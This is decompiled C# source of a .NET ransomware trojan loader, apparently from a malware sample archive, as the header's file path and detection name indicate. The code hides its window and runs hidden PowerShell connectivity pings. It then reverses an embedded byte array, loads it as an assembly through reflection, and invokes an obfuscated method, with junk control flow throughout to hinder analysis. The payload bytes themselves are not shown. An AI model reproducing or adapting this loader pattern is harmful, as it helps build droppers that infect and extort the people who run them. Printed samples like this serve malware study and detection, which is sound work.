// Decompiled with JetBrains decompiler
// Type: WindowsFormsApp25.a
// Assembly: Sega6b, Version=19.10.20069.49826, Culture=neutral, PublicKeyToken=null
// MVID: 40CCF65E-DD91-45C3-A1CB-F1C23CF84A88
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.12-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-11dba92af0462cb18ac9c9ed81f104530819287f32be261915b706f83f6e04ad.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

namespace WindowsFormsApp25
{
  public sealed class a : Form
  {
    private IContainer a;

    public a()
    {
      if (false)
        return;
      this.b();
    }

    private void a(object a, EventArgs b)
    {
      if (true)
        goto label_3;
label_1:
      int num = this.a() ? 1 : 0;
      if (false)
        return;
      this.ShowInTaskbar = num != 0;
      return;
label_3:
      this.a();
      goto label_1;
    }

    private MemoryStream a()
    {
      MemoryStream memoryStream1 = new MemoryStream();
      MemoryStream memoryStream2;
      if (true)
        memoryStream2 = memoryStream1;
      try
      {
        byte[] numArray1 = c.a();
        if (true)
          goto label_5;
label_3:
        byte[] buffer;
        byte[] numArray2 = buffer;
        int length = buffer.Length;
        if (true)
          goto label_6;
label_4:
        memoryStream2.Write(buffer, 0, buffer.Length);
        return memoryStream2;
label_6:
        Array.Reverse((Array) numArray2, 0, length);
        goto label_4;
label_5:
        buffer = numArray1;
        goto label_3;
      }
      finally
      {
        memoryStream2.Dispose();
      }
    }

    private Assembly a()
    {
      MethodInfo method = typeof (Assembly).GetMethod("Load", new System.Type[1]
      {
        typeof (byte[])
      });
      // ISSUE: variable of a boxed type
      __Boxed<int> local = (ValueType) 0;
      object[] parameters = new object[1];
      if (true)
        ;
      parameters[0] = (object) this.a().ToArray();
      return (Assembly) method.Invoke((object) local, parameters);
    }

    private MethodInfo a()
    {
      MethodInfo[] methods = this.a().GetType("NpAZeOpr8ZWwVMhTJ0.QpR2biVw9yq1KNsMk1").GetMethods();
      if (true)
        goto label_2;
label_1:
      int index;
      if (true)
        index = 0;
      MethodInfo[] methodInfoArray;
      for (; index < methodInfoArray.Length; ++index)
      {
        MethodInfo methodInfo1 = methodInfoArray[index];
        if (true)
          goto label_6;
label_5:
        MethodInfo methodInfo2;
        if (methodInfo2.Name == "OiBbIZVoV")
          return methodInfo2;
        continue;
label_6:
        methodInfo2 = methodInfo1;
        goto label_5;
      }
      return (MethodInfo) null;
label_2:
      methodInfoArray = methods;
      goto label_1;
    }

    private void a()
    {
      try
      {
        Process.Start(new ProcessStartInfo()
        {
          FileName = "powershell",
          Arguments = "Test-Connection www.yahoo.com",
          WindowStyle = ProcessWindowStyle.Hidden,
          CreateNoWindow = true
        }).WaitForExit();
        Process.Start(new ProcessStartInfo()
        {
          FileName = "powershell",
          Arguments = "Test-Connection www.bing.com",
          WindowStyle = ProcessWindowStyle.Hidden,
          CreateNoWindow = true
        }).WaitForExit();
      }
      catch
      {
        if (false)
          ;
      }
    }

    private bool a()
    {
      if (true)
        ;
      return (bool) this.a().Invoke((object) null, (object[]) null);
    }

    protected override void Dispose(bool a)
    {
      if (a && this.a != null)
        this.a.Dispose();
      int num = a ? 1 : 0;
      if (false)
        return;
      base.Dispose(num != 0);
    }

    private void b()
    {
      if (true)
        goto label_4;
label_1:
      SizeF sizeF = new SizeF(9f, 20f);
      if (true)
        goto label_5;
label_2:
      if (true)
        goto label_6;
label_3:
      this.ClientSize = new Size(770, 393);
      this.Name = "Form1";
      this.ShowInTaskbar = false;
      this.Text = "Form1";
      this.Load += new EventHandler(this.a);
      this.ResumeLayout(false);
      return;
label_6:
      this.AutoScaleMode = AutoScaleMode.Font;
      goto label_3;
label_5:
      this.AutoScaleDimensions = sizeF;
      goto label_2;
label_4:
      this.SuspendLayout();
      goto label_1;
    }
  }
}
